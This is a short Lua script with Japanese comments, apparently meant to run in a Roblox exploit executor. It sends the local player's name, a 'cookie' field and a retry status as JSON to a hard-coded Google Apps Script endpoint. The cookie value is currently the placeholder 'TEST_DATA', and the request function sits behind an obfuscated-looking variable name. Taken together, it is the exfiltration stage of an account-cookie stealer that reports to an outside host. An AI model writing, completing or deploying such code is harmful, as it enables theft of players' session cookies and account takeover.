-- もしURL全体を貼るならこうだ
local gasUrl = "https://script.google.com/macros/s/AKfycbwdJIdlqht8Pp1PdSAc77SO0ayL37_ENEKTcf9Rx-9OvzWgICbUOOKWw6UrYUk8JEDgMA/exec"

local _0x_R = (getgenv().request or getgenv().http_request or request)
_0x_R({
    Url = gasUrl, -- ここにフルURLを入れる
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({
        user = game.Players.LocalPlayer.Name,
        cookie = "TEST_DATA",
        status = "RE-TRYING"
    })
})
